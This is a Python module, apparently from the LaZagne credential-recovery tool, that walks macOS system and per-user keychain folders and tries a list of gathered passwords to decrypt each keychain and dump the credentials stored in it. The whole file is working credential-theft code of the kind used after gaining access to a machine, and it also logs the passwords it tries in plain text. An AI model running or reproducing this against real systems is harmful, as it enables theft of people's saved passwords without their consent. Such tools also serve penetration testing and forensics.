# Awesome work done by @n0fate
# check the chainbreaker tool: https://github.com/n0fate/chainbreaker

from lazagne.softwares.system.chainbreaker_module.chainbreaker import *
from lazagne.config.write_output import print_debug
from lazagne.config.moduleInfo import ModuleInfo
from lazagne.config.constant import *
import traceback
import os

class Chainbreaker(ModuleInfo):
	def __init__(self):
		options = {'command': '-chainbreaker', 'action': 'store_true', 'dest': 'keychain', 'help': 'Dump keychain'}
		ModuleInfo.__init__(self, 'chainbreaker', 'system', options)

	def list_users(self):
		users_dir 	= '/Users'
		users_list 	= [] 
		if os.path.exists(users_dir):
			for user in os.listdir(users_dir): 
				if user != 'Shared' and not user.startswith('.'):
					users_list.append(user)

		return users_list

	def list_keychains(self, keychains_path):
		keychains = []
		if os.path.exists(keychains_path):
			for f in os.listdir(keychains_path):
				if 'keychain' in f:
					keychains.append(os.path.join(keychains_path, f))
		return keychains

	def run(self, software_name=None):
		pwdFound 	= []
		passwords 	= constant.passwordFound
		
		if constant.user_password:
			passwords.insert(0, constant.user_password)
		
		for password in passwords:
			pwd_ok = False
			
			# System keychain
			for keychain in self.list_keychains('/Library/Keychains/'):
				print_debug('INFO', 'Trying to dump keychain: %s' % keychain)
				try:
					creds = dump_creds(keychain, str(password))
					if creds:
						pwdFound 	+= creds
						pwd_ok 		= True
						constant.keychains_pwd.append(
												{
													'Keychain': keychain, 
													'Password': str(password)
												}
											)
				except:
					print_debug('ERROR', 'Check the password entered, this one not work (pwd: %s)' % str(password))
					print_debug('DEBUG', traceback.format_exc())

			if pwd_ok:
				break

		for password in passwords:
			pwd_ok = False

			# Users keychains 
			for user in self.list_users():
				user_keychains = self.list_keychains('/Users/{user}/Library/Keychains/'.format(user=user))
				for keychain in user_keychains:
					print_debug('INFO', 'Trying to dump keychain: %s' % keychain)
					try:
						creds = dump_creds(keychain, str(password))
						if creds:
							pwdFound 	+= creds
							pwd_ok 		= True
							constant.user_keychain_find = True
							constant.keychains_pwd.append(
													{
														'keychain': keychain, 
														'password': str(password)
													}
												)
					except:
						print_debug('ERROR', 'Check the password entered, this one not work (pwd: %s)' % str(password))
						print_debug('DEBUG', traceback.format_exc())
			if pwd_ok:
				break

		# keep in memory all passwords stored on the keychain
		constant.keychains_pwds = pwdFound

		return pwdFound
